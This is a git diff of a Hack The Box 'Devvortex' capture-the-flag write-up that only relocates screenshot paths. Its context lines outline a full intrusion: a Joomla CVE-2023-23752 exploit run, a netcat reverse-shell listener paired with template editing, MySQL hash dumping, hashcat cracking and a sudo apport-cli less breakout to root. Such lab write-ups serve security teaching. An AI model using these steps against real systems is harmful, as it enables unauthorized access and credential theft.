@@ -42,7 +42,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.28.37
 ```
 
-![ping](devvortex_01_ping.png)
+![ping](screenshots/devvortex_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -60,7 +60,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.28.37 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](devvortex_02_nmap_allports.png)
+![allports](screenshots/devvortex_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -68,7 +68,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](devvortex_03_extractports.png)
+![extractports](screenshots/devvortex_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -84,8 +84,8 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted 1](devvortex_04_nmap_targeted_1.png)
-![targeted 2](devvortex_05_nmap_targeted_2.png)
+![targeted 1](screenshots/devvortex_04_nmap_targeted_1.png)
+![targeted 2](screenshots/devvortex_05_nmap_targeted_2.png)
 
 **Findings:**
 
@@ -111,7 +111,7 @@ The targeted scan surfaces a nginx vhost redirect; mapping `devvortex.htb` local
 whatweb http://devvortex.htb/
 ```
 
-![whatweb apex devvortex htb](devvortex_06_hosts_whatweb_apex.png)
+![whatweb apex devvortex htb](screenshots/devvortex_06_hosts_whatweb_apex.png)
 
 ---
 ### 2.2 Joomla discovery on `dev.devvortex.htb`
@@ -122,7 +122,7 @@ Virtual-host fuzzing (`gobuster vhost` with `--append-domain`) returned a **200*
 curl -s http://dev.devvortex.htb/robots.txt | head -n 40
 ```
 
-![robots txt dev subdomain](devvortex_07_robots_txt_dev_subdomain.png)
+![robots txt dev subdomain](screenshots/devvortex_07_robots_txt_dev_subdomain.png)
 
 The administrator surface is reachable over HTTP on the dev host:
 
@@ -130,7 +130,7 @@ The administrator surface is reachable over HTTP on the dev host:
 Browser: http://dev.devvortex.htb/administrator/
 ```
 
-![joomla administrator login](devvortex_08_joomla_administrator_login.png)
+![joomla administrator login](screenshots/devvortex_08_joomla_administrator_login.png)
 
 ---
 ### 2.3 Joomla version confirmation (OWASP JoomScan)
@@ -143,11 +143,11 @@ cd joomscan
 ./joomscan.pl -u http://dev.devvortex.htb
 ```
 
-![joomscan clone and run](devvortex_09_joomscan_clone_run.png)
+![joomscan clone and run](screenshots/devvortex_09_joomscan_clone_run.png)
 
 The scan run reports **Joomla 4.2.6** and enumerates **`robots.txt`**-linked directories (while still printing “Target Joomla core is not vulnerable,” which manual validation supersedes).
 
-![joomscan results joomla 4.2.6](devvortex_10_joomscan_results.png)
+![joomscan results joomla 4.2.6](screenshots/devvortex_10_joomscan_results.png)
 
 ---
 ## 3. Foothold
@@ -162,7 +162,7 @@ cd CVE-2023-23752-EXPLOIT
 python3 CVE-2023-23752.py -u http://dev.devvortex.htb
 ```
 
-![cve 2023 23752 exploit output](devvortex_11_cve_2023_23752_exploit.png)
+![cve 2023 23752 exploit output](screenshots/devvortex_11_cve_2023_23752_exploit.png)
 
 Recovered (rotate/redact before any public posting):
 
@@ -177,7 +177,7 @@ Use the disclosed **`lewis`** credentials at **`http://dev.devvortex.htb/adminis
 # Browser login at /administrator/ — dashboard confirms privileged session context.
 ```
 
-![joomla admin dashboard lewis](devvortex_12_joomla_admin_dashboard.png)
+![joomla admin dashboard lewis](screenshots/devvortex_12_joomla_admin_dashboard.png)
 
 ---
 ### 3.3 Disk-backed PHP execution via Cassiopeia (`error.php`)
@@ -190,9 +190,9 @@ nc -lvnp 443
 # http://dev.devvortex.htb/templates/cassiopeia/error.php
 ```
 
-![cassiopeia error php editor](devvortex_13_cassiopeia_error_php_editor.png)
+![cassiopeia error php editor](screenshots/devvortex_13_cassiopeia_error_php_editor.png)
 
-![reverse shell nc www-data](devvortex_14_reverse_shell_nc_www_data.png)
+![reverse shell nc www-data](screenshots/devvortex_14_reverse_shell_nc_www_data.png)
 
 ---
 ### 3.4 Confirming execution context (`www-data`)
@@ -206,7 +206,7 @@ ls /home
 cat /home/logan/user.txt
 ```
 
-![www-data home enum permission denied user txt](devvortex_15_www_data_home_enum.png)
+![www-data home enum permission denied user txt](screenshots/devvortex_15_www_data_home_enum.png)
 
 ---
 ## 4. Privilege Escalation
@@ -225,7 +225,7 @@ mysql> USE joomla;
 mysql> SHOW TABLES;
 ```
 
-![mysql joomla databases and tables](devvortex_16_mysql_joomla_tables.png)
+![mysql joomla databases and tables](screenshots/devvortex_16_mysql_joomla_tables.png)
 
 Harvest Joomla user password hashes:
 
@@ -233,7 +233,7 @@ Harvest Joomla user password hashes:
 mysql> SELECT username, email, password FROM sd4fg_users;
 ```
 
-![mysql sd4fg users bcrypt hashes](devvortex_17_mysql_sd4fg_users_hashes.png)
+![mysql sd4fg users bcrypt hashes](screenshots/devvortex_17_mysql_sd4fg_users_hashes.png)
 
 ---
 ### 4.2 Offline bcrypt cracking (`hashcat`)
@@ -244,7 +244,7 @@ Export bcrypt hashes (`$2y$`) into a **`hashcat`** input file and crack against 
 hashcat -m 3200 --user hashes /usr/share/wordlists/rockyou.txt
 ```
 
-![hashcat bcrypt logan cracked](devvortex_18_hashcat_bcrypt_logan.png)
+![hashcat bcrypt logan cracked](screenshots/devvortex_18_hashcat_bcrypt_logan.png)
 
 Recovered:
 
@@ -260,7 +260,7 @@ su logan
 cat /home/logan/user.txt
 ```
 
-![user flag logan](devvortex_19_user_flag_logan.png)
+![user flag logan](screenshots/devvortex_19_user_flag_logan.png)
 
 🏁 **User flag obtained**
 
@@ -275,7 +275,7 @@ On **`logan`**, **`sudo -l`** prompts for **`logan`**’s password and lists a c
 sudo -l
 ```
 
-![sudo l apport cli](devvortex_20_sudo_l_apport_cli.png)
+![sudo l apport cli](screenshots/devvortex_20_sudo_l_apport_cli.png)
 
 ---
 ### 4.5 Root via `sudo apport-cli` + `less` breakout
@@ -291,11 +291,11 @@ whoami
 cat /root/root.txt
 ```
 
-![apport cli menu view report](devvortex_22_apport_cli_menu_view_report.png)
+![apport cli menu view report](screenshots/devvortex_22_apport_cli_menu_view_report.png)
 
-![apport less bang bash](devvortex_21_apport_less_bang_bash.png)
+![apport less bang bash](screenshots/devvortex_21_apport_less_bang_bash.png)
 
-![root shell root txt](devvortex_23_root_shell_root_txt.png)
+![root shell root txt](screenshots/devvortex_23_root_shell_root_txt.png)
 
 🏁 **Root flag obtained**
 
